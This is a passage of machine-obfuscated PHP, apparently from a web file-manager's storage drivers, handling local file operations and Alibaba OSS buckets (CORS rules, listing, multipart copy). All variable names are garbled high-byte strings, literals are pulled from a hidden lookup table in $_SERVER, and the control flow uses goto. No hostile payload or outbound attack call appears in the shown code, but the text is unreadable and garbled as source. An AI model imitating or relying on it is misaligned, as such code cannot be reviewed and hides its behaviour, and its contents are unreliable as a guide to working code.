(isset($®ù¤ã¡­[$úº¦µµ˜])) { continue; } $ò€‘‘í[$Şõô·¾Í[2268]] = IpLocation::get($ò€‘‘í[$Şõô·¾Í[2264]]); $ò€‘‘í[$Şõô·¾Í[462]] = $¬Î’äñ®; $®ù¤ã¡­[$úº¦µµ˜] = $ò€‘‘í; } return array_values($®ù¤ã¡­); } public function deviceType($Ô±¦º’Ä) { return $Ô±¦º’Ä; } } goto aÙ¼ãƒ™‰²; bºÊŞ›·»á: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($å¼Ğºªç) { if (substr($å¼Ğºªç, 0, 2) == $_SERVER[¹Û¹Æ€][1373]) { $å¼Ğºªç = BASIC_PATH . substr($å¼Ğºªç, 2); } return $å¼Ğºªç; } public function iconvApp($¢Å¥‰»Ú) { $ÀˆĞº¤Ü =& $_SERVER[¹Û¹Æ€]; global $config; return $this->iconvTo($¢Å¥‰»Ú, $config[$ÀˆĞº¤Ü[1371]], $config[$ÀˆĞº¤Ü[1370]]); } public function iconvSystem($£¸ÅÆò¨) { $‹å«´Æ¯ =& $_SERVER[¹Û¹Æ€]; global $config; return $this->iconvTo($£¸ÅÆò¨, $config[$‹å«´Æ¯[1370]], $config[$‹å«´Æ¯[1371]]); } public function getPathOuter($í¾§ÙÁü) { $İİòÄïÛ =& $_SERVER[¹Û¹Æ€]; $€ÈÜ¯Ú = $this->iconvApp($this->pathBase); $í¾§ÙÁü = $this->iconvApp($í¾§ÙÁü); if (substr($€ÈÜ¯Ú, 0, 2) == $İİòÄïÛ[1373]) { $€ÈÜ¯Ú = BASIC_PATH . substr($€ÈÜ¯Ú, 2); } if (substr($í¾§ÙÁü, 0, 2) == $İİòÄïÛ[1373]) { $í¾§ÙÁü = BASIC_PATH . substr($í¾§ÙÁü, 2); } $€ÈÜ¯Ú = KodIO::clear($€ÈÜ¯Ú); $í¾§ÙÁü = KodIO::clear($í¾§ÙÁü); $í¾§ÙÁü = substr($í¾§ÙÁü, strlen($€ÈÜ¯Ú)); if (empty($this->pathDriver)) { return $í¾§ÙÁü; } return $this->pathDriver . $İİòÄïÛ[18] . ltrim($í¾§ÙÁü, $İİòÄïÛ[18]); } public function mkfile($èŒ†œÓ®, $­åñ•À« = '', $ŸİÄ…Âé = REPEAT_RENAME) { $èŒ†œÓ® = $this->iconvSystem($èŒ†œÓ®); @touch($èŒ†œÓ®); if ($­åñ•À«) { file_put_contents($èŒ†œÓ®, $­åñ•À«); } @chmod($èŒ†œÓ®, $this->pathAuth); return is_file($èŒ†œÓ®) ? $this->getPathOuter($èŒ†œÓ®) : !1; } public function mkdir($êüıÔ¯, $åğâß®Ú = REPEAT_SKIP) { $êüıÔ¯ = $this->iconvSystem($êüıÔ¯); if (is_dir($êüıÔ¯)) { return $this->getPathOuter($êüıÔ¯); } @mkdir($êüıÔ¯, $this->pathAuth, !0); @chmod($êüıÔ¯, $this->pathAuth); return is_dir($êüıÔ¯) ? $this->getPathOuter($êüıÔ¯) : !1; } public function copyFile($•œÌ°Œ, $œ“èØÍ) { $this->mkdir($this->pathFather($œ“èØÍ)); $•œÌ°Œ = $this->iconvSystem($•œÌ°Œ); $œ“èØÍ = $this->iconvSystem($œ“èØÍ); $ì³ÎéÆå = copy_64($•œÌ°Œ, $œ“èØÍ); @chmod($œ“èØÍ, $this->pathAuth); return $ì³ÎéÆå ? $this->getPathOuter($œ“èØÍ) : !1; } public function moveFile($ÈçŠäˆ¤, $äÜ÷¥Ó¸) { $this->mkdir($this->pathFather($äÜ÷¥Ó¸)); $ÈçŠäˆ¤ = $this->iconvSystem($ÈçŠäˆ¤); $äÜ÷¥Ó¸ = $this->iconvSystem($äÜ÷¥Ó¸); $¡÷›â£ï = intval(@rename($ÈçŠäˆ¤, $äÜ÷¥Ó¸)); if (!$¡÷›â£ï) { if ($¡÷›â£ï = intval(@copy_64($ÈçŠäˆ¤, $äÜ÷¥Ó¸))) { @unlink($ÈçŠäˆ¤); } } @chmod($äÜ÷¥Ó¸, $this->pathAuth); return $¡÷›â£ï ? $this->getPathOuter($äÜ÷¥Ó¸) : !1; } public function movePath($™Çß’Ç, $”³¬–×Ä, $é×Ô“˜‘ = false) { $â¸‚˜õó =& $_SERVER[¹Û¹Æ€]; $™Çß’Ç = $this->iconvSystem($™Çß’Ç); $”³¬–×Ä = $this->iconvSystem($”³¬–×Ä); $ƒİ÷¶Ì = rtrim($”³¬–×Ä, $â¸‚˜õó[18]) . $â¸‚˜õó[18] . ($é×Ô“˜‘ ? $é×Ô“˜‘ : get_path_this($™Çß’Ç)); if (file_exists($ƒİ÷¶Ì)) { return !1; } $şÇ»’ù… = intval(@rename($™Çß’Ç, $ƒİ÷¶Ì)); $şÇ»’ù… = file_exists($ƒİ÷¶Ì); return $şÇ»’ù… ? $this->getPathOuter($ƒİ÷¶Ì) : !1; } public function delFile($ä±“»£ö) { $ä±“»£ö = $this->iconvSystem($ä±“»£ö); if (!@unlink($ä±“»£ö)) { @chmod($ä±“»£ö, $this->pathAuth); if (!@unlink($ä±“»£ö)) { return !1; } } else { return !0; } } public function delFolder($‰Œ™ÔÕ) { $Ê¼ˆšù˜ =& $_SERVER[¹Û¹Æ€]; $‰Œ™ÔÕ = $this->iconvSystem($‰Œ™ÔÕ); if (!is_dir($‰Œ™ÔÕ)) { return !0; } if (!($¹• Ñ‹ = opendir($‰Œ™ÔÕ))) { return !1; } while (($«…¾¡«ê = readdir($¹• Ñ‹)) !== !1) { if ($«…¾¡«ê == $Ê¼ˆšù˜[20] || $«…¾¡«ê == $Ê¼ˆšù˜[1380]) { continue; } $ê’ÛÛÌÓ = $‰Œ™ÔÕ . $Ê¼ˆšù˜[18] . $«…¾¡«ê; if (is_file($ê’ÛÛÌÓ) || is_link($ê’ÛÛÌÓ)) { if (!unlink($ê’ÛÛÌÓ)) { chmod($ê’ÛÛÌÓ, $this->pathAuth); if (!unlink($ê’ÛÛÌÓ)) { return !1; } } } else { if (is_dir($ê’ÛÛÌÓ)) { chmod($ê’ÛÛÌÓ, $this->pathAuth); $ê’ÛÛÌÓ = $this->iconvApp($ê’ÛÛÌÓ); if (!$this->delFolder($ê’ÛÛÌÓ)) { return !1; } } } } closedir($¹• Ñ‹); return rmdir($‰Œ™ÔÕ); } public function rename($İ‰´ºô, $ŠšŞ¾ôÄ) { $¡¶ú„şà =& $_SERVER[¹Û¹Æ€]; $† Í£®– = $this->fileNameAuto($this->pathFather($İ‰´ºô), $ŠšŞ¾ôÄ); $† Í£®– = $this->iconvSystem($† Í£®–); $İ‰´ºô = $this->iconvSystem($İ‰´ºô); $Ù×„£¶¾ = $this->pathFather($İ‰´ºô); $±ˆ¥Ğ–± = rtrim($Ù×„£¶¾, $¡¶ú„şà[18]) . $¡¶ú„şà[18] . $† Í£®–; $§“…ÁÎã = @rename($İ‰´ºô, $±ˆ¥Ğ–±); $±ˆ¥Ğ–± = $this->iconvApp($±ˆ¥Ğ–±); return $§“…ÁÎã ? $this->getPathOuter($±ˆ¥Ğ–±) : !1; } public function size($Ê…Úëä) { $Ê…Úëä = $this->iconvSystem($Ê…Úëä); return filesize_64($Ê…Úëä); } public function info($÷çë‰ƒ½) { $÷çë‰ƒ½ = $this->iconvSystem($÷çë‰ƒ½); if ($this->isFolder($÷çë‰ƒ½)) { return $this->folderInfo($÷çë‰ƒ½); } else { if ($this->isFile($÷çë‰ƒ½)) { return $this->fileInfo($÷çë‰ƒ½); } } return !1; } protected function infoChildren($ïø¼ÖÆ”, &$óº‡×æÓ, $Îéö­È´ = true) { $óŒÃ¢ÑÂ =& $_SERVER[¹Û¹Æ€]; check_abort_echo(); $ïø¼ÖÆ” = rtrim($ïø¼ÖÆ”, $óŒÃ¢ÑÂ[18]) . $óŒÃ¢ÑÂ[18]; if ($Îéö­È´) { $ïø¼ÖÆ” = $this->iconvSystem($ïø¼ÖÆ”); } if (!($ã²İ—›¯ = @opendir($ïø¼ÖÆ”))) { return; } while (($««·÷¸ª = readdir($ã²İ—›¯)) !== !1) { if ($««·÷¸ª == $óŒÃ¢ÑÂ[20] || $««·÷¸ª == $óŒÃ¢ÑÂ[1380]) { continue; } $ƒ¾ìİæ¬ = $ïø¼ÖÆ” . $««·÷¸ª; if (is_file($ƒ¾ìİæ¬) || is_link($ƒ¾ìİæ¬)) { $óº‡×æÓ[$óŒÃ¢ÑÂ[87]]++; $óº‡×æÓ[$óŒÃ¢ÑÂ[86]] += filesize_64($ƒ¾ìİæ¬); } else { if (is_dir($ƒ¾ìİæ¬)) { $óº‡×æÓ[$óŒÃ¢ÑÂ[88]]++; $this->infoChildren($ƒ¾ìİæ¬, $óº‡×æÓ, !1); } } } closedir($ã²İ—›¯); } private function folderInfo($÷½·ƒ‡ë, $×‚ß­¹ö = false) { $ê‚¦Ÿ¸ =& $_SERVER[¹Û¹Æ€]; $÷½·ƒ‡ë = rtrim($÷½·ƒ‡ë, $ê‚¦Ÿ¸[18]) . $ê‚¦Ÿ¸[18]; $Ï¸­âˆ = $this->iconvApp($this->pathThis($÷½·ƒ‡ë)); if ($×‚ß­¹ö) { return array($ê‚¦Ÿ¸[42] => $Ï¸­âˆ, $ê‚¦Ÿ¸[94] => $this->getPathOuter($÷½·ƒ‡ë), $ê‚¦Ÿ¸[43] => $ê‚¦Ÿ¸[85]); } $¦ºšÀƒ¡ = array($ê‚¦Ÿ¸[42] => $Ï¸­âˆ, $ê‚¦Ÿ¸[94] => $this->getPathOuter($÷½·ƒ‡ë), $ê‚¦Ÿ¸[43] => $ê‚¦Ÿ¸[85], $ê‚¦Ÿ¸[210] => @filectime($÷½·ƒ‡ë), $ê‚¦Ÿ¸[95] => @filemtime($÷½·ƒ‡ë), $ê‚¦Ÿ¸[1383] => @fileatime($÷½·ƒ‡ë), $ê‚¦Ÿ¸[1384] => is_readable($÷½·ƒ‡ë), $ê‚¦Ÿ¸[1385] => is_writable($÷½·ƒ‡ë), $ê‚¦Ÿ¸[1386] => get_mode($÷½·ƒ‡ë)); return $¦ºšÀƒ¡; } private function fileInfo($àÆ±µì„, $ŸìçÑ‚ = false) { $Æœç–©ê =& $_SERVER[¹Û¹Æ€]; $ËÛÜ–äï = $this->iconvApp($this->pathThis($àÆ±µì„)); if ($ŸìçÑ‚) { return array($Æœç–©ê[42] => $ËÛÜ–äï, $Æœç–©ê[94] => $this->getPathOuter($àÆ±µì„), $Æœç–©ê[43] => $Æœç–©ê[209], $Æœç–©ê[86] => $this->size($àÆ±µì„), $Æœç–©ê[184] => $this->ext($ËÛÜ–äï)); } $ÃÃÁçä¾ = array($Æœç–©ê[42] => $ËÛÜ–äï, $Æœç–©ê[94] => $this->getPathOuter($àÆ±µì„), $Æœç–©ê[43] => $Æœç–©ê[209], $Æœç–©ê[210] => @filectime($àÆ±µì„), $Æœç–©ê[95] => @filemtime($àÆ±µì„), $Æœç–©ê[1383] => @fileatime($àÆ±µì„), $Æœç–©ê[86] => $this->size($àÆ±µì„), $Æœç–©ê[184] => $this->ext($ËÛÜ–äï), $Æœç–©ê[1384] => is_readable($àÆ±µì„), $Æœç–©ê[1385] => is_writable($àÆ±µì„), $Æœç–©ê[1386] => get_mode($àÆ±µì„)); return $ÃÃÁçä¾; } public function exist($šö¬ıÅ) { $šö¬ıÅ = $this->iconvSystem($šö¬ıÅ); return @file_exists($šö¬ıÅ); } public function isFile($ˆÊ•­™À) { $ˆÊ•­™À = $this->iconvSystem($ˆÊ•­™À); return @is_file($ˆÊ•­™À); } public function isFolder($„„Õıæ¹) { $„„Õıæ¹ = $this->iconvSystem($„„Õıæ¹); return @is_dir($„„Õıæ¹); } public function listPath($Ç©Â§¦³, $¶×™àÜ = false) { $Å¡ÕÎæÈ =& $_SERVER[¹Û¹Æ€]; $Ç©Â§¦³ = $this->iconvSystem($Ç©Â§¦³); $Ç©Â§¦³ = rtrim($Ç©Â§¦³, $Å¡ÕÎæÈ[18]) . $Å¡ÕÎæÈ[18]; $ŒŠò¿Ú¤ = array($Å¡ÕÎæÈ[92] => array(), $Å¡ÕÎæÈ[93] => array()); if (!($€Ù…÷é¹ = @opendir($Ç©Â§¦³))) { return $ŒŠò¿Ú¤; } while (($Ìˆ°Ì´¬ = readdir($€Ù…÷é¹)) !== !1) { if ($Ìˆ°Ì´¬ == $Å¡ÕÎæÈ[20] || $Ìˆ°Ì´¬ == $Å¡ÕÎæÈ[1380]) { continue; } $¡°ò±ù» = $Ç©Â§¦³ . $Ìˆ°Ì´¬; if (is_file($¡°ò±ù»)) { $ŒŠò¿Ú¤[$Å¡ÕÎæÈ[93]][] = $this->fileInfo($¡°ò±ù», $¶×™àÜ); } else { $ŒŠò¿Ú¤[$Å¡ÕÎæÈ[92]][] = $this->folderInfo($¡°ò±ù», $¶×™àÜ); } } closedir($€Ù…÷é¹); return $ŒŠò¿Ú¤; } public function listAll($†Òú•, &$³›ó”œÍ = array()) { $öÊ»İÔ© =& $_SERVER[¹Û¹Æ€]; $†Òú• = $this->iconvSystem($†Òú•); $†Òú• = rtrim($†Òú•, $öÊ»İÔ©[18]) . $öÊ»İÔ©[18]; if (!($¡Ş´ÃÇ® = @opendir($†Òú•))) { return $³›ó”œÍ; } while (($ÚÖºÍ¯Ç = readdir($¡Ş´ÃÇ®)) !== !1) { if ($ÚÖºÍ¯Ç == $öÊ»İÔ©[20] || $ÚÖºÍ¯Ç == $öÊ»İÔ©[1380]) { continue; } $³ûö‰ƒ = $†Òú• . $ÚÖºÍ¯Ç; if (is_dir($³ûö‰ƒ) && !is_link($³ûö‰ƒ)) { $³›ó”œÍ[] = array($öÊ»İÔ©[94] => $³ûö‰ƒ . $öÊ»İÔ©[18], $öÊ»İÔ©[85] => 1, $öÊ»İÔ©[95] => @filemtime($³ûö‰ƒ), $öÊ»İÔ©[86] => 0); $this->listAll($³ûö‰ƒ, $³›ó”œÍ); } else { $³›ó”œÍ[] = array($öÊ»İÔ©[94] => $³ûö‰ƒ, $öÊ»İÔ©[85] => 0, $öÊ»İÔ©[95] => @filemtime($³ûö‰ƒ), $öÊ»İÔ©[86] => $this->size($³ûö‰ƒ)); } } closedir($¡Ş´ÃÇ®); return $³›ó”œÍ; } public function has($ş»Ã¾ˆ¸, $ˆí‰¥œ = false, $¹Ìßª·Á = true) { $Û€û˜Ñ =& $_SERVER[¹Û¹Æ€]; $ş»Ã¾ˆ¸ = $this->iconvSystem($ş»Ã¾ˆ¸); $ş»Ã¾ˆ¸ = rtrim($ş»Ã¾ˆ¸, $Û€û˜Ñ[18]) . $Û€û˜Ñ[18]; if (!($ª†ñµò = @opendir($ş»Ã¾ˆ¸))) { return !1; } $¯¦÷íÑ¤ = 0; $ÀâØÉæ = 0; $›¼Ş¹µÃ = 0; while (($û‡ãÒÅ™ = readdir($ª†ñµò)) !== !1) { if ($û‡ãÒÅ™ == $Û€û˜Ñ[20] || $û‡ãÒÅ™ == $Û€û˜Ñ[1380]) { continue; } $ªÔıƒ‚Ñ = $ş»Ã¾ˆ¸ . $û‡ãÒÅ™; if ($ˆí‰¥œ) { $›¼Ş¹µÃ++; if (@is_file($ªÔıƒ‚Ñ)) { $¯¦÷íÑ¤++; } else { $ÀâØÉæ++; } if ($›¼Ş¹µÃ > 10000) { break; } continue; } if ($¹Ìßª·Á) { if (@is_file($ªÔıƒ‚Ñ)) { return !0; } } else { if (@is_dir($ªÔıƒ‚Ñ . $Û€û˜Ñ[18])) { return !0; } } } closedir($ª†ñµò); if ($ˆí‰¥œ) { return array($Û€û˜Ñ[217] => $¯¦÷íÑ¤, $Û€û˜Ñ[218] => $ÀâØÉæ); } return !1; } public function hashSimple($ü°Ûßêå) { $Ë¢†¢½ê =& $_SERVER[¹Û¹Æ€]; if (!$ü°Ûßêå) { return md5($Ë¢†¢½ê[22]); } $ü°Ûßêå = $this->iconvSystem($ü°Ûßêå); $ŸÜ¬®• = $this->size($ü°Ûßêå); $²Æ€¨…˜ = 200; $Şí³‚Á¶ = 50; if ($ŸÜ¬®• <= $²Æ€¨…˜ * $Şí³‚Á¶) { return $this->hashMd5($ü°Ûßêå) . $ŸÜ¬®•; } $ çõÑŸË = $Ë¢†¢½ê[22]; $šõ¯–½Ë = intval($ŸÜ¬®• / $Şí³‚Á¶); $˜õæÆõå = fopen($ü°Ûßêå, $Ë¢†¢½ê[1387]); if (!$˜õæÆõå) { return $ çõÑŸË; } for ($ĞŸõ…Ã½ = 0; $ĞŸõ…Ã½ < $Şí³‚Á¶; $ĞŸõ…Ã½++) { fseek_64($˜õæÆõå, $šõ¯–½Ë * $ĞŸõ…Ã½); $ çõÑŸË .= fread($˜õæÆõå, $²Æ€¨…˜); } fseek_64($˜õæÆõå, $ŸÜ¬®• - $²Æ€¨…˜); $ çõÑŸË .= fread($˜õæÆõå, $²Æ€¨…˜); fclose($˜õæÆõå); return md5($ çõÑŸË) . $ŸÜ¬®•; } public function getContent($‘ßúŒÙø) { $‘ßúŒÙø = $this->iconvSystem($‘ßúŒÙø); return file_get_contents($‘ßúŒÙø); } public function setContent($…¶òá‡”, $¹Û¾¾­Å = '') { $…¶òá‡” = $this->iconvSystem($…¶òá‡”); $Öä‡È’õ = @file_put_contents($…¶òá‡”, $¹Û¾¾­Å, LOCK_EX); clearstatcache(); @chmod($…¶òá‡”, $this->pathAuth); return $Öä‡È’õ === !1 ? !1 : !0; } public function fileSubstr($Õ–µšÙµ, $ší‰é‰ = 0, $“ ŞÀ¨© = false) { $´úìŒÌí =& $_SERVER[¹Û¹Æ€]; $Õ–µšÙµ = $this->iconvSystem($Õ–µšÙµ); if ($“ ŞÀ¨© === !1) { $“ ŞÀ¨© = $this->size($Õ–µšÙµ); } if ($“ ŞÀ¨© <= 0) { return $´úìŒÌí[22]; } $ºŒ¿ÏÅ° = fopen($Õ–µšÙµ, $´úìŒÌí[1387]); if (!$ºŒ¿ÏÅ°) { return !1; } fseek_64($ºŒ¿ÏÅ°, $ší‰é‰); $ƒÚø¤àù = fread($ºŒ¿ÏÅ°, $“ ŞÀ¨©); fclose($ºŒ¿ÏÅ°); return $ƒÚø¤àù; } public function upload($Òü”˜Òı, $è±ÖÛ„™, $Ê­‰‘² = false, $Å‹Èùãµ = REPEAT_REPLACE) { if ($Ê­‰‘²) { return $this->moveFile($è±ÖÛ„™, $Òü”˜Òı); } return $this->copyFile($è±ÖÛ„™, $Òü”˜Òı); } public function setModifyTime($‹Ã–™¨ô, $íÖÒùßÎ = '') { @touch($‹Ã–™¨ô, intval($íÖÒùßÎ)); } public function download($éñÌ•³î, $¦ëß›Á©) { return $this->iconvSystem($éñÌ•³î); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Àœ€ï‹ê) { parent::__construct($Àœ€ï‹ê); $this->signatureVersion($_SERVER[¹Û¹Æ€][226]); } public function fileOutLink($Ò‰÷«™§) { $ÉšÙ›Òí =& $_SERVER[¹Û¹Æ€]; if (substr($Ò‰÷«™§, 0, 7) == $ÉšÙ›Òí[1331]) { $Ò‰÷«™§ = $ÉšÙ›Òí[1332] . substr($Ò‰÷«™§, 7); } header($ÉšÙ›Òí[171] . $Ò‰÷«™§); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($œô®Ë’í) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹Û¹Æ€][1388]; $this->_init($œô®Ë’í); } public function _init($™ÙÛ¥¼®) { $š†³ÌÖø =& $_SERVER[¹Û¹Æ€]; foreach ($™ÙÛ¥¼® as $‹´ÁÉêÀ => $ìë¥Ìò) { if (isset($this->{$‹´ÁÉêÀ})) { $this->{$‹´ÁÉêÀ} = $ìë¥Ìò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($š†³ÌÖø[1389] . LNG($š†³ÌÖø[1390])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $«†Ë†Æ¨ =& $_SERVER[¹Û¹Æ€]; $¶©´‚Â· = new OSS\Model\CorsConfig(); $ÏÂŸˆ¸³ = new OSS\Model\CorsRule(); $ÏÂŸˆ¸³->addAllowedOrigin($«†Ë†Æ¨[1391]); $ÏÂŸˆ¸³->addAllowedMethod($«†Ë†Æ¨[1392]); $ÏÂŸˆ¸³->addAllowedMethod($«†Ë†Æ¨[1393]); $ÏÂŸˆ¸³->addAllowedMethod($«†Ë†Æ¨[1394]); $ÏÂŸˆ¸³->addAllowedMethod($«†Ë†Æ¨[1395]); $ÏÂŸˆ¸³->addAllowedMethod($«†Ë†Æ¨[170]); $ÏÂŸˆ¸³->setMaxAgeSeconds(600); $ÏÂŸˆ¸³->addExposeHeader($«†Ë†Æ¨[1396]); $ÏÂŸˆ¸³->addAllowedHeader($«†Ë†Æ¨[1391]); $¶©´‚Â·->addRule($ÏÂŸˆ¸³); try { $this->client->putBucketCors($this->bucket, $¶©´‚Â·); } catch (OSS\Core\OssException $–‚›¢¥Ç) { return !1; } return !0; } public function getBucketCors() { $Â¯óõ¸ö =& $_SERVER[¹Û¹Æ€]; $ìñ¼À„É = null; try { $ìñ¼À„É = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Å×úÛ¤) { return null; } if (!$ìñ¼À„É || !($¾ìŠÇ£ = $ìñ¼À„É->getRules())) { return null; } $Ó¬¿ó¶Ö = $¾ìŠÇ£[0]->getAllowedOrigins(); $ÇÂé÷§ù = $¾ìŠÇ£[0]->getAllowedMethods(); $›óƒÈÚì = $¾ìŠÇ£[0]->getMaxAgeSeconds(); $Ûûë¸â­ = $¾ìŠÇ£[0]->getExposeHeaders(); $Õİš¥ñÌ = $¾ìŠÇ£[0]->getAllowedHeaders(); return array($Â¯óõ¸ö[197] => isset($Ó¬¿ó¶Ö[0]) ? $Ó¬¿ó¶Ö[0] : $Â¯óõ¸ö[22], $Â¯óõ¸ö[201] => $ÇÂé÷§ù, $Â¯óõ¸ö[1397] => $›óƒÈÚì, $Â¯óõ¸ö[1398] => isset($Ûûë¸â­[0]) ? $Ûûë¸â­[0] : $Â¯óõ¸ö[22], $Â¯óõ¸ö[199] => isset($Õİš¥ñÌ[0]) ? $Õİš¥ñÌ[0] : $Â¯óõ¸ö[22]); } public function isBucketCors() { $à®“ƒ› =& $_SERVER[¹Û¹Æ€]; $°ÚÑµ²— = $this->getBucketCors(); if (!$°ÚÑµ²— || !is_array($°ÚÑµ²—)) { return !1; } if ($°ÚÑµ²—[$à®“ƒ›[197]] != $à®“ƒ›[198] || $°ÚÑµ²—[$à®“ƒ›[199]] != $à®“ƒ›[198]) { return !1; } $´È¯–±¤ = array_map($à®“ƒ›[200], $°ÚÑµ²—[$à®“ƒ›[201]]); if (!is_array($´È¯–±¤)) { $´È¯–±¤ = array(); } $‹”áçë¥ = array($à®“ƒ›[202], $à®“ƒ›[203], $à®“ƒ›[204], $à®“ƒ›[205], $à®“ƒ›[206]); $‡ğ‚‰Ÿ• = array_diff($‹”áçë¥, $´È¯–±¤); return empty($‡ğ‚‰Ÿ•); } public function mkfile($á­¤ ÛÖ, $ß„ï˜×Ö = '', $ÀŞĞƒÍÂ = REPEAT_RENAME) { $¾Ä¢äÀˆ = $this->setContent($á­¤ ÛÖ, $ß„ï˜×Ö); if ($¾Ä¢äÀˆ !== !1) { return $this->getPathOuter($á­¤ ÛÖ); } return !1; } public function mkdir($Ÿ­Ç“ö¾, $ı—îÃüš = REPEAT_SKIP) { if ($ı—îÃüš && $this->_isFolder($Ÿ­Ç“ö¾)) { return $this->getPathOuter($Ÿ­Ç“ö¾); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ÿ­Ç“ö¾)); } catch (OSS\Core\OssException $ÕŸ…ÙÛó) { return !1; } return $this->getPathOuter($Ÿ­Ç“ö¾); } private function fileList($ü‰Ë‘Á˜, $Æ§Ó’¦ = '', $€ »ñÓ = 0) { $±‡Óúğï =& $_SERVER[¹Û¹Æ€]; $ü‰Ë‘Á˜ = trim($ü‰Ë‘Á˜, $±‡Óúğï[18]); $ğöçÕâ— = empty($ü‰Ë‘Á˜) && $ü‰Ë‘Á˜ !== $±‡Óúğï[207] ? $±‡Óúğï[22] : $ü‰Ë‘Á˜ . $±‡Óúğï[18]; $ı± Î‹§ = $±‡Óúğï[22]; $“‚ş’Á‹ = 1000; $¬Ù‚€Ÿ = $Õ»×ãŸå = array(); while (!0) { check_abort(); $²¡ÎÌÓ´ = array($±‡Óúğï[1399] => $Æ§Ó’¦, $±‡Óúğï[1400] => $ğöçÕâ—, $±‡Óúğï[1401] => $“‚ş’Á‹, $±‡Óúğï[1402] => $ı± Î‹§); try { $úÔÔ‰Ö» = $this->client->listObjects($this->bucket, $²¡ÎÌÓ´); } catch (OSS\Core\OssException $²ñ×…¬ô) { break; } $ı± Î‹§ = $úÔÔ‰Ö»->getNextMarker(); $ŠäÌö®Ã = $úÔÔ‰Ö»->getObjectList(); $üì×ó—Ì = $úÔÔ‰Ö»->getPrefixList(); foreach ($ŠäÌö®Ã as $‘Ğµª¤Œ) { if ($‘Ğµª¤Œ->getKey() == $ğöçÕâ—) { continue; } $ÚÇ¸¦¿» = $‘Ğµª¤Œ->getKey(); $«À‚È¼× = $‘Ğµª¤Œ->getSize(); $Ç×ş•³û = $‘Ğµª¤Œ->getLastModified(); $Û‰Ü“° = $€ »ñÓ ? array($±‡Óúğï[42] => $ÚÇ¸¦¿», $±‡Óúğï[86] => $«À‚È¼×, $±‡Óúğï[213] => strtotime($Ç×ş•³û)) : $ÚÇ¸¦¿»; $à›º»Ö¥ = $«À‚È¼× == 0 && substr($ÚÇ¸¦¿», strlen($ÚÇ¸¦¿») - 1, 1) == $±‡Óúğï[18] ? !0 : !1; $ÛøÙĞ = array($±‡Óúğï[86] => $«À‚È¼×, $±‡Óúğï[1403] => $«À‚È¼×, $±‡Óúğï[95] => strtotime($Ç×ş•³û), $±‡Óúğï[1404] => $Ç×ş•³û); $this->cacheMethodInfoSet($ÚÇ¸¦¿», $à›º»Ö¥, $ÛøÙĞ); if ($à›º»Ö¥) { $¬Ù‚€Ÿ[] = $ÚÇ¸¦¿»; continue; } $Õ»×ãŸå[] = $Û‰Ü“°; } foreach ($üì×ó—Ì as $éã—Æ) { $¬Ù‚€Ÿ[] = $éã—Æ->getPrefix(); $this->cacheMethodInfoSet($éã—Æ->getPrefix(), !0); } if ($ı± Î‹§ === $±‡Óúğï[22]) { break; } } $this->cacheMethodInfoSet($ü‰Ë‘Á˜, !0); return array($±‡Óúğï[92] => $¬Ù‚€Ÿ, $±‡Óúğï[93] => $Õ»×ãŸå); } public function copyFile($Ò…Ëö›š, $ãÉˆâİ¿) { $õ¡ëæÌ = $this->size($Ò…Ëö›š); if ($õ¡ëæÌ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ò…Ëö›š, $this->bucket, $this->pathEncode($ãÉˆâİ¿)); } catch (OSS\Core\OssException $Š–Å°Ö‘) { return !1; } return $this->getPathOuter($ãÉˆâİ¿); } $â¥é™®¾ = $this->multiCopyObject($Ò…Ëö›š, $ãÉˆâİ¿, $õ¡ëæÌ); return $â¥é™®¾ ? $this->getPathOuter($ãÉˆâİ¿) : !1; } private function multiCopyObject($‡ Ú¾Öù, $É¯§, $›Èê—©Æ) { $–š×Ğ¸ =& $_SERVER[¹Û¹Æ€]; try { $«µÙ¡ô = array(); if ($úñ„Ğ±¯ = $this->hashMd5($‡ Ú¾Öù)) { $«µÙ¡ô = array(OSS\OssClient::OSS_HEADERS => array($–š×Ğ¸[1405] => $úñ„Ğ±¯)); } $öãÉäÆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($É¯§), $«µÙ¡ô); $ÇŞÂ½çà = 1; $û™Ü–„Ö = 0; $ËâğÓÜÀ = array(); $âËş®üÇ = 1024 * 1024 * 10; $‰ŸÊç¯ˆ = $this->client->generateMultiuploadParts($›Èê—©Æ, $âËş®üÇ); foreach ($‰ŸÊç¯ˆ as $ôµ‚ò…» => $­¨Ü©µô) { $üˆ­üÔ = $û™Ü–„Ö + (int) $­¨Ü©µô[$–š×Ğ¸[1406]]; $ÀÛ³õ¼Í = (int) $­¨Ü©µô[$–š×Ğ¸[346]] + $üˆ­üÔ - 1; $ì›õÚÊÔ = array($–š×Ğ¸[1407] => $üˆ­üÔ, $–š×Ğ¸[1408] => $ÀÛ³õ¼Í); $ËâğÓÜÀ[] = $this->client->uploadPartCopy($this->bucket, $‡ Ú¾Öù, $this->bucket, $this->pathEncode($É¯§), $ÇŞÂ½çà, $öãÉäÆ, $ì›õÚÊÔ); $ÇŞÂ½çà = $ÇŞÂ½çà + 1; } $‰Ü…úõ£ = array(); foreach ($ËâğÓÜÀ as $ôµ‚ò…» => $³ÙûÈô¥) { $‰Ü…úõ£[] = array($–š×Ğ¸[1409] => $ôµ‚ò…» + 1, $–š×Ğ¸[1410] => $³ÙûÈô¥); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($É¯§), $öãÉäÆ, $‰Ü…úõ£); } catch (OSS\Core\OssException $ñÜúÆ…‰) { return !1; } return !0; } public function moveFile($ˆ­Å±ó, $íĞÏÓ) { if ($this->copyFile($ˆ­Å±ó, $íĞÏÓ)) { $this->remove($ˆ­Å±ó); return $this->getPathOuter($íĞÏÓ); } return !1; } public function delFile($òèî™’) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($òèî™’)); } catch (OSS\Core\OssException $Âãß–•·) { return !1; } return !0; } public function delFolder($‘¾¯‰ÁÙ) { 